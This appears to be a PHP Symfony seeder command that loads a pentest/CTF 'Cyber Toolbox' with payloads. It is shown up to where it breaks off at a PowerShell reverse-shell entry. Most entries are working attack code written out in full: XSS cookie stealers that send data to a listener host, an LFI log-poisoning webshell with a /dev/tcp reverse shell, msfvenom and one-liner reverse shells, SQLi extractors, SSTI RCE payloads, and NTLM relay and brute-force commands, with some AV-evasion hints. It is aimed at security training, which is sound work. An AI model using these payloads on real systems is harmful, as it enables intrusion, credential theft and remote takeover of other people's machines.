<?php

declare(strict_types=1);

namespace App\Command;

use App\Entity\Payload;
use App\Entity\Tag;
use App\Entity\User;
use App\Security\PayloadCipher;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Component\Console\Attribute\AsCommand;
use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Input\InputOption;
use Symfony\Component\Console\Output\OutputInterface;
use Symfony\Component\Console\Style\SymfonyStyle;

/**
 * One-shot seeder: populate the Cyber Toolbox with classic pentest / CTF
 * payloads (recon, exploitation, privesc, AD, post-exploitation, defense).
 *
 * Idempotent per-title for the target owner: a payload with the same title is
 * removed before re-insertion. Tags are reused if they already exist.
 *
 * Bodies are encrypted via PayloadCipher before persist (AES-256-GCM) just
 * like the HTTP API. Meilisearch sync happens automatically through the
 * lifecycle listener — no manual reindex needed.
 */
#[AsCommand(
    name: 'app:seed:payloads',
    description: 'Seed public Cyber Toolbox payloads (pentest / CTF) under a given owner.'
)]
class SeedPayloadsCommand extends Command
{
    public function __construct(
        private readonly EntityManagerInterface $em,
        private readonly PayloadCipher $cipher,
    ) {
        parent::__construct();
    }

    protected function configure(): void
    {
        $this
            ->addOption('owner', null, InputOption::VALUE_REQUIRED, 'Owner username (must exist in users table)', 'calixteair')
            ->addOption('dry-run', null, InputOption::VALUE_NONE, 'Print what would be inserted, do not write');
    }

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        $io = new SymfonyStyle($input, $output);
        $username = (string) $input->getOption('owner');
        $dryRun = (bool) $input->getOption('dry-run');

        $owner = $this->em->getRepository(User::class)->findOneBy(['username' => $username]);
        if ($owner === null) {
            $io->error(sprintf('Owner "%s" not found. Sync with Keycloak first (login once).', $username));
            return Command::FAILURE;
        }

        $io->title(sprintf('Seeding payloads for %s (%s)', $owner->getUsername(), $owner->getEmail()));

        $payloads = $this->payloadDefinitions();
        $io->writeln(sprintf('Preparing %d payload(s)...', count($payloads)));

        if ($dryRun) {
            foreach ($payloads as $p) {
                $io->writeln(sprintf(
                    ' - [%s/%s] %s  (%s)',
                    $p['category'],
                    $p['language'] ?? '-',
                    $p['title'],
                    implode(',', $p['tags']),
                ));
            }
            $io->warning('Dry-run: no write performed.');
            return Command::SUCCESS;
        }

        $created = 0;
        foreach ($payloads as $def) {
            $this->removeExisting($owner, $def['title']);

            $payload = new Payload();
            $payload->setOwner($owner);
            $payload->setTitle($def['title']);
            $payload->setDescription($def['description']);
            $payload->setCategory($def['category']);
            $payload->setLanguage($def['language']);
            $payload->setVisibility('public');
            $payload->setBodyEncrypted($this->cipher->encrypt($def['body']));

            foreach ($def['tags'] as $tagName) {
                $payload->addTag($this->resolveTag($tagName));
            }

            $this->em->persist($payload);
            $created++;
        }

        $this->em->flush();

        $io->success(sprintf('%d payload(s) seeded. Meilisearch sync triggered via lifecycle listener.', $created));
        return Command::SUCCESS;
    }

    private function removeExisting(User $owner, string $title): void
    {
        $existing = $this->em->getRepository(Payload::class)->findBy([
            'owner' => $owner,
            'title' => $title,
        ]);
        foreach ($existing as $p) {
            $this->em->remove($p);
        }
        if (!empty($existing)) {
            $this->em->flush();
        }
    }

    private function resolveTag(string $name): Tag
    {
        $name = strtolower(trim($name));
        $tag = $this->em->getRepository(Tag::class)->findOneBy(['name' => $name]);
        if ($tag !== null) {
            return $tag;
        }
        $tag = new Tag();
        $tag->setName($name);
        $tag->setIsOfficial(true);
        $this->em->persist($tag);
        $this->em->flush();
        return $tag;
    }

    /**
     * @return list<array{title:string, description:string, category:string, language:?string, tags:list<string>, body:string}>
     */
    private function payloadDefinitions(): array
    {
        return [
            // Recon
            $this->nmapFullTcp(),
            $this->nmapUdpTop100(),
            $this->gobusterDir(),
            $this->ffufVhost(),
            $this->wpscanEnum(),
            $this->enum4linuxNg(),

            // Exploitation — Web
            $this->sqliUnion(),
            $this->sqliTimeBlind(),
            $this->xssPolyglots(),
            $this->lfiLogPoisoning(),
            $this->sstiJinjaTwig(),

            // Exploitation — Network
            $this->msfvenomRevshells(),
            $this->hydraBruteforce(),
            $this->johnHashcatCrack(),
            $this->responderRelay(),

            // Reverse shells
            $this->revshellLinuxTTY(),
            $this->revshellWindowsPowershell(),
            $this->revshellSocatTTY(),

            // Privilege escalation
            $this->linpeas(),
            $this->winpeas(),
            $this->gtfobinsSudo(),
            $this->kernelExploits(),
            $this->seImpersonate(),

            // Active Directory
            $this->kerberoasting(),
            $this->asrepRoasting(),
            $this->bloodhound(),
            $this->pthDcsync(),

            // Post-exploitation
            $this->pivotChiselSsh(),
            $this->mimikatzLazagne(),
            $this->linuxPersistence(),

            // Defense
            $this->sshHardening(),
            $this->fail2banJail(),
        ];
    }

    // =========================================================================
    // Recon
    // =========================================================================

    private function nmapFullTcp(): array
    {
        return [
            'title' => 'Nmap — Full TCP scan + service/version + default scripts',
            'description' => 'Reco TCP complete sur les 65535 ports avec detection de version (-sV) et scripts safe (-sC). Output aux 3 formats. Reflex de base sur tout engagement pentest / CTF.',
            'category' => 'recon',
            'language' => 'bash',
            'tags' => ['nmap', 'recon', 'tcp', 'port-scan', 'pentest', 'ctf', 'oscp'],
            'body' => <<<'BASH'
# Full TCP scan with service + version detection and default NSE scripts.
# --min-rate keeps CTF boxes responsive; drop it (or lower) on prod targets.
TARGET="{{TARGET}}"   # e.g. 10.10.10.10 or scanme.nmap.org
OUT="scan-${TARGET}"

nmap -sC -sV -p- --min-rate 5000 -T4 -Pn \
     -oA "${OUT}" "${TARGET}"

# Tip: grep open ports quickly
grep -E '^[0-9]+/tcp\s+open' "${OUT}.nmap"
BASH,
        ];
    }

    private function nmapUdpTop100(): array
    {
        return [
            'title' => 'Nmap — UDP top 100 scan',
            'description' => 'Reco UDP rapide sur les 100 ports les plus communs (SNMP 161, DNS 53, TFTP 69, NTP 123, IKE 500, ...). UDP est lent — evite `-p-` en UDP sauf si tu as des heures.',
            'category' => 'recon',
            'language' => 'bash',
            'tags' => ['nmap', 'recon', 'udp', 'port-scan', 'pentest'],
            'body' => <<<'BASH'
# UDP is slow (retransmits + rate limiting). Stick to top-100 by default.
TARGET="{{TARGET}}"

sudo nmap -sU --top-ports 100 --min-rate 1000 -T4 \
          -oA "udp-${TARGET}" "${TARGET}"

# SNMP community bruteforce follow-up if 161/udp is open:
#   onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "${TARGET}"
BASH,
        ];
    }

    private function gobusterDir(): array
    {
        return [
            'title' => 'Gobuster — directory bruteforce (wordlist + extensions)',
            'description' => 'Enumeration de repertoires et fichiers cachees sur un vhost HTTP. Toujours lancer avec plusieurs extensions (php, txt, html, bak, old) — les backups et les readme laissent fuiter tres souvent des credentials.',
            'category' => 'recon',
            'language' => 'bash',
            'tags' => ['gobuster', 'recon', 'web', 'bruteforce', 'fuzzing', 'ctf'],
            'body' => <<<'BASH'
URL="{{URL}}"          # http://10.10.10.10 or https://target.htb
WORDLIST="{{WORDLIST}}" # e.g. /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir \
  -u "${URL}" \
  -w "${WORDLIST}" \
  -x php,txt,html,bak,old,zip \
  -t 50 \
  -b 404,403 \
  -o gobuster-$(echo "${URL}" | tr '/:' '_').txt

# Classic follow-up: feroxbuster for recursive fuzzing, or ffuf for params.
BASH,
        ];
    }

    private function ffufVhost(): array
    {
        return [
            'title' => 'ffuf — virtual host / subdomain fuzzing',
            'description' => 'Recherche les vhosts caches via le Host: header. Indispensable sur des boxes ou le site sur IP est different du site sur nom DNS. Filtre par -fs (ou -fc/-fw) pour cacher la reponse par defaut.',
            'category' => 'recon',
            'language' => 'bash',
            'tags' => ['ffuf', 'recon', 'web', 'vhost', 'subdomain', 'fuzzing', 'ctf'],
            'body' => <<<'BASH'
DOMAIN="{{DOMAIN}}"      # e.g. target.htb
IP="{{IP}}"              # e.g. 10.10.10.10
WORDLIST="{{WORDLIST}}"  # e.g. /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
FILTER_SIZE="{{FILTER_SIZE}}" # adjust after a probe request to the default vhost

ffuf \
  -u "http://${IP}/" \
  -H "Host: FUZZ.${DOMAIN}" \
  -w "${WORDLIST}":FUZZ \
  -fs "${FILTER_SIZE}" \
  -t 80 \
  -of md -o ffuf-vhost.md

# Remember to add discovered vhosts to /etc/hosts before visiting.
BASH,
        ];
    }

    private function wpscanEnum(): array
    {
        return [
            'title' => 'WPScan — WordPress enumeration (users, plugins, themes, vulns)',
            'description' => 'Enumeration et detection de vulnerabilites sur un site WordPress. Un token API (gratuit sur wpscan.com) debloque la base CVE. Couvre ~90% des challenges WordPress THM / HTB.',
            'category' => 'recon',
            'language' => 'bash',
            'tags' => ['wpscan', 'recon', 'web', 'wordpress', 'cve', 'pentest'],
            'body' => <<<'BASH'
URL="{{URL}}"               # http://target/wp/ or https://blog.target
API_TOKEN="{{API_TOKEN}}"   # optional — get one at wpscan.com/api

wpscan \
  --url "${URL}" \
  --enumerate u,vp,vt,cb,dbe \
  --plugins-detection aggressive \
  --random-user-agent \
  --api-token "${API_TOKEN}" \
  --format cli-no-color \
  -o wpscan.txt

# Follow-up: bruteforce a valid username
#   wpscan --url "${URL}" --usernames admin --passwords rockyou.txt -t 40
BASH,
        ];
    }

    private function enum4linuxNg(): array
    {
        return [
            'title' => 'enum4linux-ng — SMB / NetBIOS enumeration',
            'description' => 'Rewrite moderne d\'enum4linux. Enumere shares SMB, utilisateurs, groupes, sessions, os info, password policy. Fonctionne en null session ou avec credentials.',
            'category' => 'recon',
            'language' => 'bash',
            'tags' => ['enum4linux-ng', 'smb', 'recon', 'active-directory', 'netbios', 'pentest'],
            'body' => <<<'BASH'
TARGET="{{TARGET}}"

# -A = all (shares, users, groups, policy, OS info, printers)
# Anonymous session first. If it fails, retry with -u/-p.
enum4linux-ng -A "${TARGET}" | tee enum4linux-${TARGET}.txt

# With credentials:
#   enum4linux-ng -A -u "{{USERNAME}}" -p "{{PASSWORD}}" "${TARGET}"

# Complementary one-liners:
#   smbclient -L //${TARGET}/ -N              # list shares (null session)
#   smbmap -H ${TARGET} -u guest -p ''        # share rights from guest
#   rpcclient -U '' -N ${TARGET}              # interactive RPC
BASH,
        ];
    }

    // =========================================================================
    // Exploitation — Web
    // =========================================================================

    private function sqliUnion(): array
    {
        return [
            'title' => 'SQLi — UNION-based (column probing → data extraction)',
            'description' => 'Exploitation d\'une injection SQL in-band en UNION. Demarche : detecter via erreur / guillemet, compter les colonnes via ORDER BY, identifier les colonnes affichees, extraire version + schemas + tables + dumps. Exemples MySQL — la syntaxe change sur PostgreSQL / MSSQL / Oracle.',
            'category' => 'exploitation',
            'language' => 'plaintext',
            'tags' => ['sqli', 'web', 'injection', 'mysql', 'union', 'pentest', 'ctf'],
            'body' => <<<'TXT'
# ---------------------------------------------------------------------------
# MySQL / MariaDB UNION-based SQL injection cheatsheet
# ---------------------------------------------------------------------------

# 1. Detect the injection point
?id=1'            → SQL error (quote broke the statement)
?id=1' AND 1=1-- -  → normal page
?id=1' AND 1=2-- -  → blank / different page

# 2. Count columns with ORDER BY (increment until error)
?id=1' ORDER BY 1-- -
?id=1' ORDER BY 2-- -
...
?id=1' ORDER BY N-- -  → first error reveals N-1 columns

# 3. Identify which columns are reflected on screen
?id=-1' UNION SELECT 1,2,3,4-- -

# 4. Fingerprint
?id=-1' UNION SELECT 1,version(),database(),current_user()-- -

# 5. Dump schemas / tables / columns
?id=-1' UNION SELECT 1,GROUP_CONCAT(schema_name),3,4 FROM information_schema.schemata-- -
?id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
?id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -

# 6. Extract rows
?id=-1' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4 FROM users-- -

# 7. WAF bypass tricks
   - Replace spaces with /**/ or %09 (tab)
   - Case-mutate keywords (UnIoN SeLeCt)
   - Comments variants: # (MySQL), -- - , /* */

# sqlmap one-shot (when manual is a drag):
sqlmap -u "http://TARGET/item?id=1" --batch --dbs --risk=2 --level=5
TXT,
        ];
    }

    private function sqliTimeBlind(): array
    {
        return [
            'title' => 'SQLi — time-based blind (MySQL + Python extractor)',
            'description' => 'Quand aucune sortie n\'est reflectee et que meme les erreurs sont silencieuses : exploitation via un delai mesurable. SLEEP(5) en MySQL, pg_sleep(5) en PostgreSQL, WAITFOR DELAY en MSSQL. Script Python bit-a-bit fourni.',
            'category' => 'exploitation',
            'language' => 'python',
            'tags' => ['sqli', 'web', 'blind', 'time-based', 'python', 'pentest', 'ctf'],
            'body' => <<<'PY'
#!/usr/bin/env python3
"""Time-based blind SQLi extractor (MySQL).

Proof of concept: extracts the current database name character-by-character
using a binary search over ASCII codes. Adjust `oracle_url` and `payload` to
match the target's injection point.
"""
import requests, string, time

BASE   = "{{BASE_URL}}"   # e.g. http://target.htb/item
PARAM  = "{{PARAM}}"      # e.g. "id"
BASELINE_ID = "{{BASELINE_ID}}" # e.g. "1"
DELAY  = 3                # seconds to wait in the injected SLEEP()
CHARS  = string.printable

def probe(payload: str) -> float:
    t0 = time.time()
    try:
        requests.get(BASE, params={PARAM: payload}, timeout=DELAY + 5)
    except requests.ReadTimeout:
        pass
    return time.time() - t0

def truthy(payload: str) -> bool:
    return probe(payload) >= DELAY

def extract_length(query: str) -> int:
    for n in range(1, 120):
        p = f"{BASELINE_ID}' AND IF(LENGTH(({query}))={n},SLEEP({DELAY}),0)-- -"
        if truthy(p):
            return n
    raise RuntimeError("length not found in 120")

def extract_char(query: str, pos: int) -> str:
    lo, hi = 32, 126
    while lo <= hi:
        mid = (lo + hi) // 2
        p = f"{BASELINE_ID}' AND IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid},SLEEP({DELAY}),0)-- -"
        if truthy(p):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

def extract(query: str) -> str:
    n = extract_length(query)
    return "".join(extract_char(query, i) for i in range(1, n + 1))

if __name__ == "__main__":
    print("[*] db name:", extract("SELECT DATABASE()"))
    print("[*] version:", extract("SELECT VERSION()"))
PY,
        ];
    }

    private function xssPolyglots(): array
    {
        return [
            'title' => 'XSS — polyglots, DOM, filter bypass',
            'description' => 'Cheatsheet XSS : payloads reflechis, stockes, DOM-based, et les classiques bypasses de filtres (tag stripping, attribute-based, javascript: URIs, template literals).',
            'category' => 'exploitation',
            'language' => 'plaintext',
            'tags' => ['xss', 'web', 'injection', 'javascript', 'pentest', 'ctf', 'rootme'],
            'body' => <<<'TXT'
# ---------------------------------------------------------------------------
# XSS payload cheatsheet
# ---------------------------------------------------------------------------

# Detection
<script>alert(1)</script>
"><svg/onload=alert(1)>
javascript:alert(1)

# Polyglot (bypasses a LOT of filters — Gareth Heyes style)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teMPLate/</textArEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

# Tag stripping bypass
<scr<script>ipt>alert(1)</scr</script>ipt>

# Attribute-based (when tags are blacklisted)
" onfocus=alert(1) autofocus x="
" onmouseover=alert(1) x="

# Image / SVG onerror
<img src=x onerror=alert(document.cookie)>
<svg><script>alert(1)</script></svg>

# DOM-based (sinks: innerHTML, document.write, location, eval, setTimeout)
#index.html#<img src=x onerror=alert(1)>   → when JS does innerHTML=hash

# Cookie stealer (exfil to burp collab / a listener)
<script>fetch('https://{{LISTENER}}/?c='+document.cookie)</script>

# Session hijack via fetch (same-origin)
<script>fetch('/api/me').then(r=>r.text()).then(t=>fetch('https://{{LISTENER}}/?x='+btoa(t)))</script>

# CSP bypass via JSONP
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

# Filter-fuzzer tool of choice: XSStrike, dalfox
#   dalfox url "http://target/?q=FUZZ" --blind https://{{LISTENER}}
TXT,
        ];
    }

    private function lfiLogPoisoning(): array
    {
        return [
            'title' => 'LFI → RCE via Apache log poisoning',
            'description' => 'Quand un LFI permet de lire /var/log/apache2/access.log mais pas de SSRF ou d\'upload : injecter du PHP via le User-Agent, puis l\'inclure. Classique sur challenges LFI old-school (Root-Me, VulnHub).',
            'category' => 'exploitation',
            'language' => 'bash',
            'tags' => ['lfi', 'rce', 'php', 'web', 'log-poisoning', 'ctf', 'rootme'],
            'body' => <<<'BASH'
# Prereq: confirmed LFI like ?page=../../../../etc/passwd
TARGET_LFI="{{TARGET}}/index.php?page=../../../../var/log/apache2/access.log"
LHOST="{{LHOST}}"
LPORT="{{LPORT}}"

# 1. Poison the log with a PHP webshell in the User-Agent
curl -s -A '<?php system($_GET["c"]); ?>' "{{TARGET}}/"

# 2. Trigger the LFI + run a command through the injected shell
curl -s "${TARGET_LFI}&c=id"
curl -s "${TARGET_LFI}&c=whoami"

# 3. Upgrade to a reverse shell (spawn a listener: nc -lvnp ${LPORT})
curl -s --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'" \
     -G "${TARGET_LFI}"

# Nginx variant: /var/log/nginx/access.log
# /proc/self/environ poisoning: set a PHP payload in User-Agent, include /proc/self/environ
# PHP session poisoning: include /var/lib/php/sessions/sess_<PHPSESSID>
BASH,
        ];
    }

    private function sstiJinjaTwig(): array
    {
        return [
            'title' => 'SSTI — Jinja2 / Twig detection + RCE',
            'description' => 'Server-Side Template Injection : repertorie les payloads de detection puis d\'escalade jusqu\'au RCE selon le moteur. Les deux moteurs les plus rencontres en CTF sont Jinja2 (Flask) et Twig (Symfony).',
            'category' => 'exploitation',
            'language' => 'plaintext',
            'tags' => ['ssti', 'web', 'jinja2', 'twig', 'flask', 'symfony', 'rce', 'ctf'],
            'body' => <<<'TXT'
# ---------------------------------------------------------------------------
# Server-Side Template Injection
# ---------------------------------------------------------------------------

# Detection (value should be rendered, not echoed as-is)
{{7*7}}              → 49     Jinja2, Twig, Nunjucks
${7*7}               → 49     Velocity, Freemarker (JSP)
<%= 7*7 %>           → 49     ERB (Ruby)
#{7*7}               → 49     Ruby, Pug

# Fingerprint (narrow down the engine)
{{7*'7'}}            → '7777777' → Jinja2 (Python)
{{7*'7'}}            → 49        → Twig (PHP)
${7*7}               → 49        → Freemarker

# ---------------------------------------------------------------------------
# Jinja2 (Flask) — RCE
# ---------------------------------------------------------------------------
{{ ''.__class__.__mro__[1].__subclasses__() }}   # enumerate subclasses, find <class 'subprocess.Popen'>
{{ ''.__class__.__mro__[1].__subclasses__()[N]('id', shell=True, stdout=-1).communicate() }}

# Shorter (since Jinja 2.7):
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}

# ---------------------------------------------------------------------------
# Twig (Symfony) — RCE
# ---------------------------------------------------------------------------
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

# Twig >= 1.19 — filter_var tricks
{{ ['id']|filter('system') }}

# ---------------------------------------------------------------------------
# Tooling
# ---------------------------------------------------------------------------
tplmap -u "http://target/page?name=*" --os-shell
TXT,
        ];
    }

    // =========================================================================
    // Exploitation — Network / Services
    // =========================================================================

    private function msfvenomRevshells(): array
    {
        return [
            'title' => 'MSFVenom — reverse shells multi-plateformes',
            'description' => 'Generateurs MSFVenom pour Linux x64, Windows exe, PHP, JSP, ASPX. Garde en tete : signatures AV triviales. Pour prod, encoder avec `--encoder x86/shikata_ga_nai -i 5` ou passer a un framework C2.',
            'category' => 'exploitation',
            'language' => 'bash',
            'tags' => ['msfvenom', 'metasploit', 'reverse-shell', 'exploitation', 'pentest', 'ctf', 'oscp'],
            'body' => <<<'BASH'
LHOST="{{LHOST}}"
LPORT="{{LPORT}}"

# Linux x64 ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} \
         -f elf -o shell.elf

# Windows x64 EXE (staged meterpreter)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} \
         -f exe -o shell.exe

# PHP web shell
msfvenom -p php/reverse_php LHOST=${LHOST} LPORT=${LPORT} \
         -f raw -o shell.php

# JSP (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} \
         -f raw -o shell.jsp

# WAR (deploy via Tomcat manager)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} \
         -f war -o shell.war

# ASPX (IIS)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} \
         -f aspx -o shell.aspx

# Python (cross-platform)
msfvenom -p cmd/unix/reverse_python LHOST=${LHOST} LPORT=${LPORT} -f raw

# Matching handler (Metasploit):
#   use exploit/multi/handler
#   set payload windows/x64/meterpreter/reverse_tcp
#   set LHOST ${LHOST}; set LPORT ${LPORT}; run
BASH,
        ];
    }

    private function hydraBruteforce(): array
    {
        return [
            'title' => 'Hydra — SSH / FTP / HTTP-POST bruteforce',
            'description' => '3 variantes commentees de Hydra : credentials sur SSH, sur FTP, et sur un formulaire HTTP POST avec motif d\'echec. Pense a reduire `-t` sur un vrai assessment pour eviter le lockout.',
            'category' => 'exploitation',
            'language' => 'bash',
            'tags' => ['hydra', 'bruteforce', 'ssh', 'ftp', 'http', 'pentest', 'ctf'],
            'body' => <<<'BASH'
TARGET="{{TARGET}}"
USER="{{USER}}"                     # single user OR use -L users.txt
WORDLIST="{{WORDLIST}}"             # e.g. /usr/share/wordlists/rockyou.txt

# ---- SSH ------------------------------------------------------------------
hydra -l "${USER}" -P "${WORDLIST}" -t 4 -f -I ssh://${TARGET}

# ---- FTP ------------------------------------------------------------------
hydra -L users.txt -P "${WORDLIST}" -t 8 -f ftp://${TARGET}

# ---- HTTP POST (login form with "Invalid" on failure) --------------------
# Replace:
#   /login      → form action
#   username^/password^ → field names (Hydra substitutes ^USER^/^PASS^)
#   Invalid     → substring present on WRONG credentials
hydra -l "${USER}" -P "${WORDLIST}" -t 16 -f ${TARGET} \
      http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Tips
#  -I  : ignore restore file
#  -f  : stop on first hit
#  -V  : verbose (show every attempt)
#  -e nsr : also try null, same-as-login, reversed password
BASH,
        ];
    }

    private function johnHashcatCrack(): array
    {
        return [
            'title' => 'John / Hashcat — NTLM, bcrypt, $1$, sha256 cracking',
            'description' => 'Table rapide des modes Hashcat + commandes John the Ripper equivalentes pour les formats les plus rencontres (NTLM, NTLMv2, bcrypt, md5crypt, sha512crypt). Wordlists standards : rockyou.txt, SecLists.',
            'category' => 'exploitation',
            'language' => 'bash',
            'tags' => ['hashcat', 'john', 'cracking', 'hashes', 'ntlm', 'bcrypt', 'pentest', 'ctf', 'rootme'],
            'body' => <<<'BASH'
WORDLIST="/usr/share/wordlists/rockyou.txt"
RULES="/usr/share/hashcat/rules/best64.rule"
HASHFILE="hashes.txt"

# ---- Hashcat modes --------------------------------------------------------
#   0     = MD5
#   100   = SHA1
#   500   = md5crypt  (Linux $1$)
#   1800  = sha512crypt (Linux $6$)
#   3200  = bcrypt ($2a$ / $2b$)
#   1000  = NTLM
#   5500  = NetNTLMv1
#   5600  = NetNTLMv2 (Responder captures)
#   13100 = Kerberos 5 TGS-REP (kerberoast)
#   18200 = Kerberos 5 AS-REP
#   22000 = WPA-PBKDF2-PMKID+EAPOL

hashcat -m 1000 -a 0 "${HASHFILE}" "${WORDLIST}"            # NTLM, straight
hashcat -m 1000 -a 0 "${HASHFILE}" "${WORDLIST}" -r "${RULES}"  # + rules
hashcat -m 3200 "${HASHFILE}" "${WORDLIST}" --username     # bcrypt w/ user col
hashcat -m 5600 "${HASHFILE}" "${WORDLIST}"                # Responder NTLMv2

# Mask attack (policy-driven)
hashcat -m 1000 -a 3 "${HASHFILE}" '?u?l?l?l?l?d?d?d'

# ---- John the Ripper ------------------------------------------------------
john --wordlist="${WORDLIST}" "${HASHFILE}"
john --wordlist="${WORDLIST}" --rules=KoreLogic "${HASHFILE}"
john --format=sha512crypt "${HASHFILE}" --wordlist="${WORDLIST}"
john --show "${HASHFILE}"      # print cracked creds

# Classic unshadow flow (from /etc/passwd + /etc/shadow)
unshadow passwd shadow > hashes
john --wordlist="${WORDLIST}" hashes
BASH,
        ];
    }

    private function responderRelay(): array
    {
        return [
            'title' => 'Responder + ntlmrelayx — LLMNR poisoning → NTLM relay',
            'description' => 'Attaque interne classique : Responder empoisonne LLMNR/NBT-NS pour capturer des hashes NTLMv2, ou chaine avec ntlmrelayx pour relay vers SMB non-signe. Pense a desactiver SMB/HTTP servers de Responder avant le relay.',
            'category' => 'exploitation',
            'language' => 'bash',
            'tags' => ['responder', 'ntlmrelayx', 'llmnr', 'nbt-ns', 'active-directory', 'relay', 'pentest', 'oscp'],
            'body' => <<<'BASH'
IFACE="{{IFACE}}"         # e.g. tun0, eth0
TARGET_FILE="targets.txt" # SMB targets without signing (output of crackmapexec -M smb --gen-relay-list)

# ---- Capture mode (NTLMv2 hashes → crack offline with hashcat -m 5600) ---
sudo responder -I ${IFACE} -wrf

# ---- Relay mode: Responder as authenticator, ntlmrelayx as relay ---------
# Edit /etc/responder/Responder.conf and set SMB = Off, HTTP = Off
sudo responder -I ${IFACE} -wrf &

# List targets (non-signing SMB hosts in the subnet)
crackmapexec smb 10.10.10.0/24 --gen-relay-list ${TARGET_FILE}

# Relay to SMB: dump SAM or execute a command
sudo impacket-ntlmrelayx -tf ${TARGET_FILE} -smb2support \
     --no-http-server -socks
# or: --escalate-user lowpriv  (if Resource-Based Constrained Delegation)

# proxychains socks5 via ntlmrelayx:
#   echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
#   proxychains smbclient -U lowpriv //dc01/c$
BASH,
        ];
    }

    // =========================================================================
    // Reverse shells
    // =========================================================================

    private function revshellLinuxTTY(): array
    {
        return [
            'title' => 'Reverse shell Linux — one-liners + TTY upgrade',
            'description' => 'Top 6 des reverse shells Linux qui marchent toujours + la sequence d\'upgrade TTY (pty.spawn + stty raw -echo + TERM) indispensable pour editer avec vim, utiliser Ctrl+C, etc.',
            'category' => 'exploitation',
            'language' => 'bash',
            'tags' => ['reverse-shell', 'linux', 'bash', 'python', 'tty', 'pentest', 'ctf', 'oscp'],
            'body' => <<<'BASH'
LHOST="{{LHOST}}"
LPORT="{{LPORT}}"

# Listener first:
#   nc -lvnp ${LPORT}     (or rlwrap nc -lvnp for line editing)

# ---- Bash TCP --------------------------------------------------------------
bash -c "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1"

# ---- nc with -e (old netcat only) -----------------------------------------
nc -e /bin/bash ${LHOST} ${LPORT}

# ---- nc without -e (mkfifo trick) -----------------------------------------
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc ${LHOST} ${LPORT} > /tmp/f

# ---- Python 3 -------------------------------------------------------------
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("'${LHOST}'",'${LPORT}'));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'

# ---- Perl -----------------------------------------------------------------
perl -e 'use Socket;$i="'${LHOST}'";$p='${LPORT}';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# ---- PHP ------------------------------------------------------------------
php -r '$sock=fsockopen("'${LHOST}'",'${LPORT}');exec("/bin/sh -i <&3 >&3 2>&3");'

# ===========================================================================
# Once connected: TTY upgrade (the MUST-KNOW dance)
# ===========================================================================
# In the reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background with ^Z, then back on the local listener:
#   stty raw -echo; fg
#
# Back in the shell:
export TERM=xterm-256color
stty rows 50 columns 190       # match your local terminal (stty size)
BASH,
        ];
    }

    private function revshellWindowsPowershell(): array
    {
        return [
            'title' => 'Reverse shell Windows — PowerShell (incl. base64 one-liner)',
            'description' => 'Classique Nishang `Invoke-PowerShellTcp` en one-liner, puis la version encodee base64 UTF-16LE pour etre passee via `powershell -e` sans quoting hell. Marche sur Win10/Server 2016+. AMSI peut bloquer — envelopper avec un bypass pour prod.',
            'category' => 'exploitation',
            'language' => 'powershell',
            'tags' => ['reverse-shell', 'windows', 'powershell', 'nishang', 'pentest', 'oscp'],
            'body' => <<<'PS1'
# LHOST = your IP, LPORT = your listener
$LHOST = "{{LHOST}}"
$LPORT = {{LPORT}}

# ---------------------------------------------------------------------------
# One-liner: TcpClient + StreamReader/Writer
# ---------------------------------------------------------------------------
$c = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)
    $r = (iex $d 2>&1 | Out-String )
    $rb = ([text.encoding]::ASCII).GetBytes($r + "PS " + (pwd).Path + "> ")
    $s.Write($rb, 0, $rb.Length)
    $s.Flush()
}
$c.Close()

# ---------------------------------------------------------------------------
# Base64 encoded version (ready to paste as `powershell -e <BASE64>`)
# Encoding recipe on attacker Linux box:
# ---------------------------------------------------------------------------
# $ PS='$c = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT); ...'   # full script above
# $ echo -n "$PS" | iconv -t UTF-16LE | base64 -w0
# $ # → paste result into:
# $ powershell.exe -nop -w hidden -e <BASE64>

# ---------------------------------------------------------------------------
# Nishang Invoke-PowerShellTcp (cradle, fileless)
# ---------------------------------------------------------------------------
